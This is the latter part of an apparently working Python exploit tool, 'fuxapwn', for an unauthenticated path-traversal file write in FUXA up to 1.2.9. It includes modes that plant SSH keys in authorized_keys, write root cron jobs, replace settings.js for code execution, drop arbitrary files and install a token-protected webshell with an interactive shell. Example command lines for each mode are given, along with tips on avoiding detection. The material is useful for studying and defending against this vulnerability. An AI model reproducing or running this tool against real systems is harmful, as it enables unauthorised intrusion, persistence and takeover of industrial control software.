def run(args: argparse.Namespace) -> int:
    if not args.quiet:
        print(BANNER, flush=True)

    ex = FuxaUploadExploit(
        base_url=args.url,
        timeout=args.timeout,
        verify_tls=not args.insecure,
        proxy=args.proxy,
        verbose=not args.quiet,
    )

    print(f"[*] Target: {args.url}", flush=True)

    # Recon mode runs on /api/settings directly — no canary needed, and we
    # explicitly do NOT want to write anything unless --probe-root /
    # --probe-home is set.
    if args.mode == "recon":
        ok, info = ex.fingerprint()
        if ok:
            print(f"[+] /api/version reachable, banner='{info}'", flush=True)
        else:
            print(f"[-] /api/version unreachable: {info}", flush=True)
            if not args.force:
                return 1

        # Load --home-wordlist if supplied. One username per line, blanks
        # and '#' comments ignored so the operator can paste from notes.
        # BOM-aware so PowerShell-generated files (UTF-16 LE w/ BOM is the
        # PS 5.1 default for `echo x > file`) load without UnicodeDecodeError.
        home_candidates: Optional[List[str]] = None
        if args.home_wordlist:
            try:
                with open(args.home_wordlist, "rb") as f:
                    raw = f.read()
            except OSError as e:
                print(f"[-] Could not read --home-wordlist {args.home_wordlist}: "
                      f"{e}", flush=True)
                return 2
            if raw.startswith(b"\xff\xfe"):
                text = raw.decode("utf-16-le").lstrip("\ufeff")
            elif raw.startswith(b"\xfe\xff"):
                text = raw.decode("utf-16-be").lstrip("\ufeff")
            elif raw.startswith(b"\xef\xbb\xbf"):
                text = raw.decode("utf-8-sig")
            else:
                try:
                    text = raw.decode("utf-8")
                except UnicodeDecodeError:
                    text = raw.decode("latin-1")
            home_candidates = [
                line.strip() for line in text.splitlines()
                if line.strip() and not line.strip().startswith("#")
            ]
            if not home_candidates:
                print(f"[-] --home-wordlist {args.home_wordlist} is empty after "
                      "stripping comments/blanks.", flush=True)
                return 2
            print(f"[*] Loaded {len(home_candidates)} home candidate(s) from "
                  f"{args.home_wordlist}", flush=True)

        return do_recon(ex, depth=args.depth,
                        probe_root=args.probe_root,
                        probe_home=args.probe_home,
                        home_candidates=home_candidates)

    # Everything else uses the write primitive; start with the reachability +
    # canary checks we've always done.
    ok, info = ex.fingerprint()
    if not ok:
        print(f"[-] /api/version reachability failed: {info}", flush=True)
        if not args.force:
            return 1
        print("[!] --force given, continuing anyway", flush=True)
    else:
        print(f"[+] /api/version reachable, banner='{info}'", flush=True)

    # webshell-exec is a pure client mode — no canary write.
    if args.mode == "webshell-exec":
        if not (args.ws_host and args.ws_port and args.ws_path
                and args.ws_token):
            print("[-] --ws-host, --ws-port, --ws-path, and --ws-token are "
                  "all required for mode=webshell-exec", flush=True)
            return 2
        client = FuxaWebshellClient(
            host=args.ws_host,
            port=args.ws_port,
            ws_path=args.ws_path,
            ws_token=args.ws_token,
            timeout=args.timeout + 60,
            use_tls=args.ws_tls,
            verify_tls=not args.insecure,
            proxy=args.proxy,
        )
        if args.interact:
            _interactive_loop(client)
            return 0
        if not args.ws_cmd:
            print("[-] --ws-cmd is required for mode=webshell-exec without "
                  "--interact", flush=True)
            return 2
        code, body = client.exec(args.ws_cmd)
        if code != 200:
            print(f"[-] HTTP {code}: {body}", flush=True)
            return 1
        sys.stdout.write(body)
        if body and not body.endswith("\n"):
            sys.stdout.write("\n")
        sys.stdout.flush()
        return 0

    # 1) Run the proof-of-write canary first so we know the path traversal
    #    works on this instance before dropping anything heavier. Skippable
    #    via --no-canary for engagements where the extra filesystem artifact
    #    is undesirable.
    if args.no_canary:
        print("[*] Stage 1 — canary SKIPPED (--no-canary). Proceeding "
              "straight to mode-specific payload.", flush=True)
    else:
        canary_path = args.canary or "/tmp/healthcheck"
        if args.canary_content:
            try:
                with open(args.canary_content, "rb") as f:
                    canary_body = f.read()
            except OSError as e:
                print(f"[-] Could not read --canary-content "
                      f"{args.canary_content}: {e}", flush=True)
                return 2
        else:
            canary_body = payload_proof(args.url)
        print(f"[*] Stage 1 — proof-of-write canary -> {canary_path}",
              flush=True)
        res = ex.write_arbitrary(canary_path, canary_body,
                                 appdir_depth=args.depth)
        print(f"    HTTP {res['status_code']}  bytes={res['wrote_bytes']}  "
              f"server={res['response_text']!r}", flush=True)
        if res["success"]:
            print(f"[!] Canary left on target: {canary_path}  "
                  f"(clean up once you have exec)", flush=True)
        else:
            errno = res.get("errno")
            if errno == "EACCES":
                print("[-] Canary write failed (EACCES). FUXA lacks write "
                      "permission at the canary path. Use --canary to pick "
                      "a writable target (FUXA's own _appdata dir, /tmp, "
                      "or /home/<fuxa-user>/).", flush=True)
            elif errno == "ENOENT":
                print("[-] Canary write failed (ENOENT). The parent directory "
                      "of the canary path does not exist on the target. Use "
                      "--canary to point at an existing directory.",
                      flush=True)
            else:
                print("[-] Canary write failed. The instance may already be "
                      "patched, secured by an upstream WAF, or the appDir "
                      "depth is wrong (try --depth 12).", flush=True)
            if not args.force:
                return 1

    # 2) Mode-specific follow-up
    if args.mode == "canary":
        print("[+] Done. Canary stage only (use --mode for more).", flush=True)
        return 0

    if args.mode == "settings-rce":
        if not args.cmd:
            print("[-] --cmd is required for mode=settings-rce", flush=True)
            return 2
        if not args.appdata:
            print("[-] --appdata is required for mode=settings-rce "
                  "(absolute path to FUXA's _appdata directory, e.g. "
                  "/tmp/FUXA-1.2.9/server/_appdata)", flush=True)
            return 2
        real_settings = _fetch_real_settings_for_payload(ex)
        target = posixpath.join(args.appdata.replace("\\", "/"), "settings.js")
        print(f"[*] Stage 2 — writing replacement settings.js to {target}",
              flush=True)
        res = ex.write_arbitrary(target,
                                 payload_settings_js_rce(args.cmd,
                                                         real_settings),
                                 appdir_depth=args.depth,
                                 file_type="svg")  # svg = raw text write
        print(f"    HTTP {res['status_code']}  bytes={res['wrote_bytes']}  "
              f"server={res['response_text']!r}", flush=True)
        if not res["success"]:
            errno = res.get("errno")
            if errno:
                print(f"[-] Write failed with errno={errno}.", flush=True)
            return 1
        print("[+] settings.js replaced. Payload will execute on the next "
              "FUXA process start (admin restart, package update, host "
              "reboot, or watchdog respawn).", flush=True)
        return 0

    if args.mode == "ssh-key":
        if not args.pubkey:
            print("[-] --pubkey FILE is required for mode=ssh-key", flush=True)
            return 2
        if not args.home:
            print("[-] --home is required for mode=ssh-key (e.g. /home/fuxa "
                  "or /root, depending on which user FUXA runs as — "
                  "determine this with --mode recon first)", flush=True)
            return 2
        with open(args.pubkey, "r", encoding="utf-8") as f:
            pubkey = f.read()
        home_posix = args.home.replace("\\", "/").rstrip("/")
        target = posixpath.join(home_posix, ".ssh", "authorized_keys")

        # Derive the account name from the home path for the success hint.
        # /home/anthony -> anthony, /root -> root, otherwise leave placeholder.
        if home_posix == "/root":
            target_user = "root"
        elif home_posix.startswith("/home/"):
            target_user = home_posix[len("/home/"):].split("/", 1)[0] or "<user>"
        else:
            target_user = "<user>"

        # The write primitive can only OVERWRITE the file — we have no read
        # primitive, so we cannot read-then-append to preserve existing keys.
        # Announce this loudly so the operator doesn't brick legitimate
        # access for the real account owner.
        print("[!] WARNING: this mode OVERWRITES the entire authorized_keys "
              "file. Any keys currently authorized for this account will no "
              "longer work. For engagements where that matters, install a "
              "webshell first, use it to `cat` the existing authorized_keys, "
              "append your key locally, then `--mode drop` the combined "
              f"file back to {target}.", flush=True)
        print(f"[*] Stage 2 — writing (OVERWRITE) pubkey -> {target}",
              flush=True)
        res = ex.write_arbitrary(target,
                                 payload_authorized_keys(pubkey),
                                 appdir_depth=args.depth,
                                 file_type="svg")
        print(f"    HTTP {res['status_code']}  bytes={res['wrote_bytes']}  "
              f"server={res['response_text']!r}", flush=True)
        if res["success"]:
            # Figure out the host:port for the hint string from --url.
            parsed = urlparse(args.url)
            host_hint = parsed.hostname or "<target-host>"
            print(f"[+] Key written. Try:  ssh -i {args.pubkey.replace('.pub', '')} "
                  f"{target_user}@{host_hint}", flush=True)
            return 0

        errno = res.get("errno")
        if errno == "ENOENT":
            print(f"[-] Write failed (ENOENT) — {home_posix}/.ssh/ likely does "
                  "not exist on the target. fs.writeFileSync cannot create "
                  "parent directories. Workaround: drop a webshell or cron "
                  f"payload first, run `mkdir -p {home_posix}/.ssh && chmod "
                  f"700 {home_posix}/.ssh` through it, then retry this mode.",
                  flush=True)
        elif errno == "EACCES":
            print(f"[-] Write failed (EACCES) — FUXA does not have write "
                  f"access to {home_posix}/.ssh/. Either --home is wrong "
                  "(recon with --probe-home to confirm the running user), "
                  "or the directory is mode 0700 owned by a different user.",
                  flush=True)
        elif errno:
            print(f"[-] Write failed with errno={errno}.", flush=True)
        return 1

    if args.mode == "drop":
        if not args.target or args.payload_file is None:
            print("[-] --target and --payload-file are required for mode=drop",
                  flush=True)
            return 2
        with open(args.payload_file, "rb") as f:
            content = f.read()
        print(f"[*] Stage 2 — dropping {args.payload_file} ({len(content)} B)"
              f" -> {args.target}", flush=True)
        res = ex.write_arbitrary(args.target, content,
                                 appdir_depth=args.depth,
                                 file_type=args.file_type)
        print(f"    HTTP {res['status_code']}  bytes={res['wrote_bytes']}  "
              f"server={res['response_text']!r}", flush=True)
        if not res["success"]:
            errno = res.get("errno")
            if errno == "ENOENT":
                print(f"[-] Drop failed (ENOENT). The parent directory of "
                      f"{args.target} does not exist — fs.writeFileSync won't "
                      "mkdir. Use an existing directory, or drop a webshell "
                      "first and run `mkdir -p` through it.", flush=True)
            elif errno == "EACCES":
                print(f"[-] Drop failed (EACCES). FUXA lacks write permission "
                      f"at {args.target}. Target a directory owned by (or "
                      "writable by) the FUXA service user.", flush=True)
            elif errno:
                print(f"[-] Drop failed with errno={errno}.", flush=True)
            return 1
        return 0

    if args.mode == "cron":
        if not args.cron_cmd:
            print("[-] --cron-cmd is required for mode=cron", flush=True)
            return 2
        cron_path = args.cron_path
        schedule = args.cron_schedule

        # Decide whether to include a user field, based on the cron file
        # format conventions. /etc/cron.d/* and /etc/crontab require one;
        # /var/spool/cron/crontabs/<user> style files must NOT have one.
        if args.cron_user is None:
            if cron_path.startswith("/etc/cron.d/") or cron_path == "/etc/crontab":
                user_field: Optional[str] = "root"
            else:
                user_field = None
        elif args.cron_user == "":
            user_field = None
        else:
            user_field = args.cron_user

        body = payload_cron_job(schedule, user_field, args.cron_cmd)
        print(f"[*] Cron file   : {cron_path}", flush=True)
        print(f"[*] Schedule    : {schedule}", flush=True)
        print(f"[*] Run-as user : {user_field or '(none — user-crontab format)'}",
              flush=True)
        print(f"[*] Command     : {args.cron_cmd}", flush=True)
        print(f"[*] Body:\n{body.decode('utf-8', errors='replace').rstrip()}",
              flush=True)
        print(f"[*] Stage 2 — writing cron file", flush=True)
        res = ex.write_arbitrary(cron_path, body,
                                 appdir_depth=args.depth,
                                 file_type="svg")
        print(f"    HTTP {res['status_code']}  bytes={res['wrote_bytes']}  "
              f"server={res['response_text']!r}", flush=True)
        if not res["success"]:
            errno = res.get("errno")
            if errno == "EACCES":
                print(f"[-] Cron write failed (EACCES). FUXA is NOT running "
                      f"as a user that can write {cron_path}. For non-root "
                      "FUXA, try /var/spool/cron/crontabs/<fuxa-user> "
                      "(Debian/Vixie) or /var/spool/cron/<fuxa-user> "
                      "(RHEL/cronie). Note: those user-crontab paths usually "
                      "require mode 0600 which fs.writeFileSync cannot set — "
                      "cronie accepts, Vixie rejects. Use --mode recon "
                      "--probe-home to confirm the running user first.",
                      flush=True)
            elif errno == "ENOENT":
                print(f"[-] Cron write failed (ENOENT). Parent directory of "
                      f"{cron_path} doesn't exist on this target — cron is "
                      "either not installed or uses a different layout.",
                      flush=True)
            elif errno:
                print(f"[-] Cron write failed with errno={errno}.", flush=True)
            else:
                print("[-] Cron write failed. Common causes: FUXA is not "
                      "running as root (cannot write into /etc/cron.d/), the "
                      "target uses a cron variant that requires mode 0600 on "
                      "user-crontab files, or the cron path on this distro "
                      "is different. Use --mode recon to confirm the running "
                      "user before retrying.", flush=True)
            return 1
        if cron_path.startswith("/etc/cron.d/"):
            print("[+] /etc/cron.d/ is re-read by cron every minute; expect "
                  "first execution within 60 s. No FUXA restart required.",
                  flush=True)
        else:
            print("[+] Cron file written. First execution within 60 s if "
                  "the cron daemon accepts this path and mode (user-crontab "
                  "paths often require 0600 — validate on target). No FUXA "
                  "restart required.", flush=True)
        return 0

    if args.mode == "webshell":
        # Required input: the _appdata directory where settings.js lives.
        if not args.appdata:
            print("[-] --appdata is required for mode=webshell "
                  "(absolute path to FUXA's _appdata directory, e.g. "
                  "/tmp/FUXA-1.2.9/server/_appdata)", flush=True)
            return 2

        # Generate secrets if the operator didn't supply them. Reusing the
        # same values across runs makes --mode webshell-exec / --interact
        # trivial, so we echo them back prominently.
        ws_port = args.ws_port
        ws_path = args.ws_path or ("/_" + secrets.token_hex(12))
        if not ws_path.startswith("/"):
            ws_path = "/" + ws_path
        ws_token = args.ws_token or secrets.token_urlsafe(24)

        real_settings = _fetch_real_settings_for_payload(ex)
        target = posixpath.join(args.appdata.replace("\\", "/"), "settings.js")
        print(f"[*] Webshell port  : {ws_port}", flush=True)
        print(f"[*] Webshell path  : {ws_path}", flush=True)
        print(f"[*] Webshell token : {ws_token}", flush=True)
        print(f"[*] Stage 2 — writing webshell payload to {target}",
              flush=True)
        res = ex.write_arbitrary(target,
                                 payload_webshell_js(ws_port, ws_path,
                                                     ws_token,
                                                     real_settings),
                                 appdir_depth=args.depth,
                                 file_type="svg")  # svg = raw text write
        print(f"    HTTP {res['status_code']}  bytes={res['wrote_bytes']}  "
              f"server={res['response_text']!r}", flush=True)
        if not res["success"]:
            errno = res.get("errno")
            if errno:
                print(f"[-] Payload write failed with errno={errno}.",
                      flush=True)
            else:
                print("[-] Payload write failed — see canary diagnostics "
                      "above.", flush=True)
            return 1

        print("[+] Webshell payload installed. Listener activates on the "
              "next FUXA cold start (admin restart, package update, host "
              "reboot, watchdog/pm2/systemd respawn, docker restart). "
              "Consider pairing with --mode cron for a near-immediate "
              "execution window that doesn't depend on FUXA restarting.",
              flush=True)

        # Derive the target host from --url for helper strings and auto-interact.
        parsed = urlparse(args.url)
        host = parsed.hostname or ""
        use_tls = parsed.scheme == "https"

        curl_url = f"http{'s' if use_tls else ''}://{host}:{ws_port}{ws_path}"
        print("\n[*] Once FUXA restarts, reach the shell with either:", flush=True)
        print(f"    curl -s -H 'X-Auth-Token: {ws_token}' \\\n"
              f"         --data-urlencode 'cmd=id' '{curl_url}'", flush=True)
        print(f"    curl -s '{curl_url}?t={quote(ws_token, safe='')}"
              f"&cmd={quote('id', safe='')}'", flush=True)
        print(f"    {sys.argv[0]} -u {args.url} --mode webshell-exec \\\n"
              f"         --ws-host {host} --ws-port {ws_port} \\\n"
              f"         --ws-path '{ws_path}' --ws-token '{ws_token}' \\\n"
              f"         --ws-cmd 'id'", flush=True)

        if args.interact:
            client = FuxaWebshellClient(
                host=args.ws_host or host,
                port=ws_port,
                ws_path=ws_path,
                ws_token=ws_token,
                timeout=args.timeout + 60,
                use_tls=(args.ws_tls or use_tls),
                verify_tls=not args.insecure,
                proxy=args.proxy,
            )
            _interactive_loop(client)

        return 0

    print(f"[-] Unknown mode: {args.mode}", flush=True)
    return 2


def parse_args(argv: list[str]) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog="fuxapwn",
        description=("FUXA <=1.2.9 unauthenticated path-traversal arbitrary "
                     "file write (CVE-2026-25895). Authorized testing only."),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  # Unauth recon — identify running user + Node-RED status:\n"
            "  %(prog)s -u http://target:1881 --mode recon\n\n"
            "  # Same, plus an active probe that confirms whether FUXA is root:\n"
            "  %(prog)s -u http://target:1881 --mode recon --probe-root\n\n"
            "  # Same, plus probe /home/<user>/ to name a non-root service user\n"
            "  # when install paths didn't leak it:\n"
            "  %(prog)s -u http://target:1881 --mode recon \\\n"
            "       --probe-root --probe-home\n\n"
            "  # Probe with a custom username wordlist (one name per line):\n"
            "  %(prog)s -u http://target:1881 --mode recon \\\n"
            "       --probe-home --home-wordlist ./client-usernames.txt\n\n"
            "  # Just prove the write primitive works:\n"
            "  %(prog)s -u http://target:1881 --mode canary\n\n"
            "  # Drop a cron job that fires within 60s — works when FUXA runs\n"
            "  # as root (docker default) without waiting for a FUXA restart:\n"
            "  %(prog)s -u http://target:1881 --mode cron \\\n"
            "       --cron-cmd 'id > /tmp/fx-cron.txt 2>&1'\n\n"
            "  # Replace settings.js so the next FUXA restart runs `id > /tmp/pwn`:\n"
            "  %(prog)s -u http://target:1881 --mode settings-rce \\\n"
            "       --appdata /tmp/FUXA-1.2.9/server/_appdata \\\n"
            "       --cmd 'id > /tmp/pwn 2>&1'\n\n"
            "  # Drop an SSH key into the FUXA service user's authorized_keys:\n"
            "  %(prog)s -u http://target:1881 --mode ssh-key \\\n"
            "       --home /home/anthony --pubkey ~/.ssh/id_ed25519.pub\n\n"
            "  # Drop an arbitrary file:\n"
            "  %(prog)s -u http://target:1881 --mode drop \\\n"
            "       --target /etc/cron.d/pwn --payload-file ./cron.txt\n\n"
            "  # Install an HTTP webshell listener via settings.js replacement,\n"
            "  # then drop into an interactive REPL once FUXA restarts:\n"
            "  %(prog)s -u http://target:1881 --mode webshell \\\n"
            "       --appdata /tmp/FUXA-1.2.9/server/_appdata \\\n"
            "       --ws-port 31337 --interact\n\n"
            "  # Same, but skip the canary write to minimize filesystem artifacts:\n"
            "  %(prog)s -u http://target:1881 --mode webshell --no-canary \\\n"
            "       --appdata /tmp/FUXA-1.2.9/server/_appdata --ws-port 31337\n\n"
            "  # Connect to an already-installed webshell (values printed by\n"
            "  # the previous invocation):\n"
            "  %(prog)s -u http://target:1881 --mode webshell-exec \\\n"
            "       --ws-host target --ws-port 31337 \\\n"
            "       --ws-path /_abc123 --ws-token SECRET --interact\n"
        ),
    )
    p.add_argument("-u", "--url", required=True,
                   help="FUXA base URL (e.g. http://10.10.185.14:1881)")
    p.add_argument("--mode", default="canary",
                   choices=["recon", "canary", "settings-rce", "ssh-key",
                            "drop", "cron", "webshell", "webshell-exec"],
                   help="Exploit stage to run (default: canary)")
    p.add_argument("--canary", default=None,
                   help="Override the canary write path (default: "
                        "/tmp/healthcheck — deliberately bland; no CVE ID in "
                        "the filename or content to avoid obvious IOCs).")
    p.add_argument("--canary-content", default=None,
                   help="Path to a local file whose contents will be used as "
                        "the canary body. Overrides the built-in 'healthcheck "
                        "ok\\n' default. Use when you specifically want a "
                        "demo/PoC marker file on the target.")
    p.add_argument("--no-canary", action="store_true",
                   help="Skip the proof-of-write canary and go straight to "
                        "the mode-specific payload. Use when any extra "
                        "filesystem artifact is undesirable. You lose the "
                        "pre-flight diagnostic — if your main write fails, "
                        "there's no earlier signal to distinguish a patched "
                        "server from a depth/path misconfiguration.")
    p.add_argument("--depth", type=int, default=10,
                   help="How many '..' hops to climb out of appDir "
                        "(default: 10 — enough for any real install)")
    p.add_argument("--timeout", type=int, default=15)
    p.add_argument("--insecure", action="store_true",
                   help="Skip TLS verification")
    p.add_argument("--proxy", default=None,
                   help="HTTP/S proxy (e.g. http://127.0.0.1:8080) — useful "
                        "for Burp inspection")
    p.add_argument("--quiet", action="store_true")
    p.add_argument("--force", action="store_true",
                   help="Continue even if reachability or canary stages fail")

    # mode=recon
    p.add_argument("--probe-root", action="store_true",
                   help="Active probe: attempt a 0-byte write to /root/ to "
                        "confirm whether FUXA is running as root. Leaves a "
                        "small marker file; clean up once you have exec.")
    p.add_argument("--probe-home", action="store_true",
                   help="Active probe: iterate /home/<user>/ with 0-byte "
                        "writes across a candidate list (or --home-wordlist) "
                        "to infer the running user when paths don't leak it "
                        "and /root is not writable. Home dirs are typically "
                        "mode 0700, so a successful write strongly implies "
                        "FUXA runs as that user. Leaves marker files per "
                        "positive hit; clean up once you have exec.")
    p.add_argument("--home-wordlist", default=None,
                   help="Path to a newline-separated file of usernames to "
                        "probe under /home/<user>/ (overrides the built-in "
                        "candidate list). '#' comments and blank lines "
                        "ignored. Use when you have engagement-specific "
                        "naming conventions to try.")

    # mode=settings-rce
    p.add_argument("--cmd", default=None,
                   help="Shell command to embed in the replacement settings.js")
    p.add_argument("--appdata", default=None,
                   help="Absolute path to FUXA's _appdata directory")

    # mode=ssh-key
    p.add_argument("--pubkey", default=None,
                   help="Path to public key file to append")
    p.add_argument("--home", default=None,
                   help="Home directory of the FUXA service user")

    # mode=drop
    p.add_argument("--target", default=None,
                   help="Absolute path to drop the file at (mode=drop)")
    p.add_argument("--payload-file", default=None,
                   help="Local file whose contents will be uploaded (mode=drop)")
    p.add_argument("--file-type", default="bin",
                   choices=["bin", "svg"],
                   help="'bin' = base64-decoded write (any bytes); "
                        "'svg' = raw text write, no decoding (default: bin)")

    # mode=cron
    p.add_argument("--cron-path", default="/etc/cron.d/fuxa-health",
                   help="Absolute path the cron file is written to. "
                        "/etc/cron.d/<name> is re-read every minute by cron "
                        "when FUXA runs as root. For a non-root FUXA user, "
                        "try /var/spool/cron/crontabs/<user> (Debian/Vixie) "
                        "or /var/spool/cron/<user> (RHEL/cronie) — note "
                        "that those paths typically require mode 0600 "
                        "which the write primitive cannot set. "
                        "(default: /etc/cron.d/fuxa-health)")
    p.add_argument("--cron-schedule", default="* * * * *",
                   help="Cron schedule expression, five fields "
                        "(default: '* * * * *' = every minute)")
    p.add_argument("--cron-user", default=None,
                   help="User field for /etc/cron.d/* and /etc/crontab "
                        "(auto-inferred as 'root' for those paths). "
                        "Pass '' (empty) to force omission for user-crontab "
                        "format.")
    p.add_argument("--cron-cmd", default=None,
                   help="Command cron will execute (required for mode=cron). "
                        "Will be passed to /bin/sh via the cron line.")

    # mode=webshell + mode=webshell-exec
    p.add_argument("--ws-port", type=int, default=31337,
                   help="TCP port the in-process webshell listener will bind "
                        "on the target. Must be free, firewall-reachable "
                        "from the operator, and distinct from FUXA's UI "
                        "port (default: 31337).")
    p.add_argument("--ws-path", default=None,
                   help="URL path the webshell listens on. Anything else "
                        "returns 404. Default: random 24-hex-char path "
                        "printed after deployment.")
    p.add_argument("--ws-token", default=None,
                   help="Auth token required on every request (X-Auth-Token "
                        "header or ?t= query). Default: random 24-byte "
                        "urlsafe token printed after deployment.")
    p.add_argument("--ws-host", default=None,
                   help="Host to connect to for mode=webshell-exec / "
                        "--interact. Defaults to the host portion of --url.")
    p.add_argument("--ws-tls", action="store_true",
                   help="Use https:// when talking to the webshell endpoint "
                        "(the embedded listener is plain HTTP by default).")
    p.add_argument("--ws-cmd", default=None,
                   help="Single command to execute via mode=webshell-exec "
                        "(mutually exclusive with --interact).")
    p.add_argument("--interact", action="store_true",
                   help="After deploying (mode=webshell) or connecting "
                        "(mode=webshell-exec), enter an interactive REPL "
                        "that ships commands to the in-process listener "
                        "and prints stdout/stderr.")

    return p.parse_args(argv)


def main(argv: Optional[list[str]] = None) -> int:
    args = parse_args(argv if argv is not None else sys.argv[1:])
    try:
        return run(args)
    except KeyboardInterrupt:
        print("\n[!] Interrupted.", flush=True)
        return 130


if __name__ == "__main__":
    raise SystemExit(main())
